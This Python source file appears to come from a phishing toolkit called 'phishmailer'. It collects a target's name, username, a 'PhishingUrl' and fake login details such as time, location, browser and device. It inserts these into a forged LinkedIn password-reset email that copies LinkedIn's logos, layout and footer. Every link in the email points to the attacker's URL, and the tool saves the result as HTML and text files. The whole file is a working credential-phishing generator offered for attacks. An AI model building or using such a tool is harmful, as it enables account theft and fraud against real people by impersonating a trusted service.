import os
import sys
from Core.helper.date import monthName
from Core.helper.color import green, white, blue, start, alert, numbering

def Custom():
	global Device
	global Browser
	
	print("")
	print(start + " /Custom Pick\\ ")
	print(alert + " Enter Browser")
	print("")
	
	Browser = input(green + "root@phishmailer/Device/Custom:~ ")
	print(alert + " Enter Device")
	Device = input("root@phishmailer/Device/Custom:~ ")

def AllNeed():
	global Browser
	global Device
	
	print(start + " Pick The Options That Fits Your Attack: ")
	print(numbering(1) + blue + " Chrome" + white + "  »" + blue + " Windows" + white + " «")
	print(numbering(2) + blue + " Safari" + white + "  »" + blue + " IPhone" + white + "  «")
	print(numbering(3) + blue + " Edge" + white + "    »" + blue + " Windows" + white + " «")
	print(numbering(4) + blue + " Safari" + white + "  »" + blue + " MacOS" + white + "   «")
	print(numbering(5) + blue + " Firefox" + white + " »" + blue + " Linux" + white + "   «")
	print(numbering(6) + blue + " Chrome" + white + "  »" + blue + " Samsung" + white + " «")
	print(numbering(7) + blue + " Safari" + white + "  »" + blue + " IPad" + white + "    «")
	print(numbering(8) + white + "    »" + blue + " Custom" + white + " «")
	print("")
	DevicePick = int(input(green + "root@phishmailer/Device:~ " + white))
	
	if DevicePick == 1:
		Browser = ("Chrome")
		Device = ("Windows")
	
	elif DevicePick == 2:
		Browser = ("Safari")
		Device = ("IPhone")
		
	elif DevicePick == 3:
		Browser = ("Edge")
		Device = ("Windows")
	
	elif DevicePick == 4:
		Browser = ("Safari")
		Device  = ("MacOS")
	
	elif DevicePick == 5:
		Browser = ("Firefox")
		Device = ("Linux")
	
	elif DevicePick == 6:
		Browser = ("Chrome")
		Device = ("Samsung")
	
	elif DevicePick == 7:
		Browser =("Safari")
		Device = ("IPad")
		
	elif DevicePick == 8:
		Custom()
	
	else:
		print(alert + " Invalid Input")
		print(alert + " Going With Default")
		Browser = ("Explorer")
		Device = ("Windows")

def Linkedin():
	Name = input(start + " Enter Target Name: ")
	username = input(start + " Enter Target Username: ")
	Url = input(start + " Enter Your PhishingUrl: ")
	Time = input(start + " Enter Time pm/am (example 10:00pm): ")
	Date = input(start + " Enter Date: ")
	Country = input(start + " Enter Country: ")
	City = input(start + " Enter City: ")
	
	print("")
	print(start + " Enter Month When Login Happend")
	print(numbering(1) + white + " January")
	print(numbering(2) + white + " February")
	print(numbering(3) + white + " March")
	print(numbering(4) + white + " April")
	print(numbering(5) + white + " May")
	print(numbering(6) + white + " June")
	print(numbering(7) + white + " July")
	print(numbering(8) + white + " August")
	print(numbering(9) + white + " September")
	print(numbering(10) + white + " October")
	print(numbering(11) + white + " November")
	print(numbering(12) + white + " December")
	print("")
	
	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
	month = monthName(monthpick)
	
	AllNeed()
	
	source = ("""
	<div style="overflow: hidden; color: transparent; visibility: hidden; mso-hide: all; width: 0; font-size: 0; opacity: 0; height: 0;">Confirm your identity.</div>
	<table style="background-color: #edf0f3; table-layout: fixed; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#EDF0F3">
	<tbody>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" align="center"><center style="width: 100%;">
	<table style="background-color: #ffffff; margin: 0 auto; max-width: 512px; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; width: inherit; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" role="presentation" border="0" width="512" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF">
	<tbody>
	<tr>
	<td style="background-color: #f6f8fa; padding: 12px; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; border-bottom: 1px solid #ECECEC;" bgcolor="#F6F8FA">
	<table style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; width: 100% !important; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; min-width: 100% !important;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" align="left" valign="middle"><a style="cursor: pointer; color: #0073b1; -webkit-text-size-adjust: 100%; display: inline-block; text-decoration: none; -ms-text-size-adjust: 100%;" href="{}"> <img style="outline: none; -ms-interpolation-mode: bicubic; color: #ffffff; text-decoration: none;" src="https://static.licdn.com/sc/p/com.linkedin.email-assets-frontend%3Aemail-assets-frontend-static-content%2B__latest__/f/%2Femail-assets-frontend%2Fimages%2Femail%2Fphoenix%2Flogos%2Flogo_phoenix_header_blue_78x66_v1.png" alt="LinkedIn" width="40" height="34" border="0" /></a></td>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" align="right" valign="middle" width="100%">
	<table style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="padding: 0 0 0 10px; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" align="left" valign="middle">
	<p style="margin: 0; font-weight: 400;"><span style="word-wrap: break-word; color: #4c4c4c; word-break: break-word; font-weight: 400; -ms-word-break: break-all; font-size: 14px; line-height: 1.429; overflow-wrap: break-word;">{}</span></p>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" width="1">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;">
	<table style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="padding: 20px 24px 10px 24px; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;">
	<table style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; padding-bottom: 20px;">
	<h2 style="margin: 0; color: #262626; font-weight: bold; font-size: 20px; line-height: 1.2;">Hi {}!</h2>
	</td>
	</tr>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; padding-bottom: 20px;">
	<p style="margin: 0; color: #4c4c4c; font-weight: 400; font-size: 16px; line-height: 1.25;">We have recived a request about a reset on your LinkedIn-account.</p>
	</td>
	</tr>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; padding-bottom: 20px;">
	<h2 style="margin: 0; color: #262626; font-weight: bold; font-size: 24px; line-height: 1.167;">027620</h2>
	</td>
	</tr>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; padding-bottom: 20px;">
	<p style="margin: 0; color: #4c4c4c; font-weight: 400; font-size: 16px; line-height: 1.25;">Submit this code to reset your account</p>
	</td>
	</tr>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; padding-bottom: 20px;">
	<p style="margin: 0; color: #4c4c4c; font-weight: 400; font-size: 16px; line-height: 1.25;">Thank you for helping us keep your account safe.</p>
	<p style="margin: 0; color: #4c4c4c; font-weight: 400; font-size: 16px; line-height: 1.25;">The team behind LinkedIn</p>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	<table style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="background-color: #f8fafc; padding: 16px 24px; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" bgcolor="#F8FAFC">
	<h2 style="margin: 0; color: #262626; font-weight: bold; font-size: 14px; line-height: 1.429; margin-bottom: 12px;">Time and area</h2>
	<p style="margin: 0; color: #737373; font-weight: bold; font-size: 12px; line-height: 1.333;">Date:</p>
	<p style="margin: 0; color: #737373; font-weight: 400; font-size: 12px; line-height: 1.333; margin-bottom: 12px;">{} {} 2020 {} (GMT)</p>
	<p style="margin: 0; color: #737373; font-weight: bold; font-size: 12px; line-height: 1.333;">Operating System</p>
	<p style="margin: 0; color: #737373; font-weight: 400; font-size: 12px; line-height: 1.333; margin-bottom: 12px;">{}</p>
	<p style="margin: 0; color: #737373; font-weight: bold; font-size: 12px; line-height: 1.333;">Browser:</p>
	<p style="margin: 0; color: #737373; font-weight: 400; font-size: 12px; line-height: 1.333; margin-bottom: 12px;">{}</p>
	<p style="margin: 0; color: #737373; font-weight: bold; font-size: 12px; line-height: 1.333;">approximately location:</p>
	<p style="margin: 0; color: #737373; font-weight: 400; font-size: 12px; line-height: 1.333; margin-bottom: 12px;">{}, {}</p>
	<p style="margin: 0; color: #737373; font-weight: 400; font-size: 12px; line-height: 1.333; margin-top: 12px;"><strong>Don't you recognize this request?</strong> <a style="cursor: pointer; color: #0073b1; -webkit-text-size-adjust: 100%; display: inline-block; text-decoration: none; -ms-text-size-adjust: 100%;" href="{}">Change you password</a> Immediately.</p>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;">
	<table style="background-color: #edf0f3; padding: 0 24px; color: #6a6c6d; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; text-align: center;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#EDF0F3">
	<tbody>
	<tr>
	<td style="padding: 16px 0 0 0; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; text-align: center;" align="center">&nbsp;</td>
	</tr>
	<tr>
	<td style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;">
	<table style="-webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="padding: 0 0 12px 0; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; text-align: center;" align="center">&nbsp;</td>
	</tr>
	<tr>
	<td style="padding: 0 0 12px 0; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; text-align: center;" align="center">
	<p style="margin: 0; word-wrap: break-word; color: #6a6c6d; word-break: break-word; font-weight: 400; -ms-word-break: break-all; font-size: 12px; line-height: 1.333; overflow-wrap: break-word;">This email got sent to {}. <a style="cursor: pointer; color: #6a6c6d; -webkit-text-size-adjust: 100%; text-decoration: underline; display: inline-block; -ms-text-size-adjust: 100%;" href="{}">Read more about why this is important.</a></p>
	</td>
	</tr>
	<tr>
	<td style="padding: 0 0 8px 0; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; text-align: center;" align="center"><a style="cursor: pointer; color: #6a6c6d; -webkit-text-size-adjust: 100%; text-decoration: underline; display: inline-block; -ms-text-size-adjust: 100%;" href="{}"><img style="outline: none; -ms-interpolation-mode: bicubic; color: #ffffff; display: block; text-decoration: none;" src="https://static.licdn.com/sc/p/com.linkedin.email-assets-frontend%3Aemail-assets-frontend-static-content%2B__latest__/f/%2Femail-assets-frontend%2Fimages%2Femail%2Fphoenix%2Flogos%2Flogo_phoenix_footer_darkgray_197x48_v1.png" alt="LinkedIn" width="58" height="14" border="0" /></a></td>
	</tr>
	<tr>
	<td style="padding: 0 0 12px 0; -webkit-text-size-adjust: 100%; mso-table-rspace: 0pt; mso-table-lspace: 0pt; -ms-text-size-adjust: 100%; text-align: center;" align="center">
	<p style="margin: 0; color: #6a6c6d; font-weight: 400; font-size: 12px; line-height: 1.333;">&copy; 2020 LinkedIn Ireland Unlimited Company, Wilton Plaza, Wilton Place, Dublin 2.</p>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</center></td>
	</tr>
	</tbody>
	</table>
	<p><img style="outline: none; -ms-interpolation-mode: bicubic; color: #ffffff; text-decoration: none; width: 1px; height: 1px;" role="presentation" src="http://www.linkedin.com/emimp/ip_WkdONVluY3dMV3M0ZUd0eU4yOW5MWFY0OmMyVmpkWEpwZEhsZllYUnZYMk5vWVd4c1pXNW5aVjl6Wlc1a1gzQnBiZz09Og==.gif" alt="" /></p>""".format(Url, username, username, Date, month, Time, Device, Browser, City, Country, Url, Name, Url, Url))

	filename = input(start + " Enter Name On HTML File: ")
	TXTname = input(start + " Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")
	
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(source)
	TXT_file.close()
	print(alert + " TXT file Created")
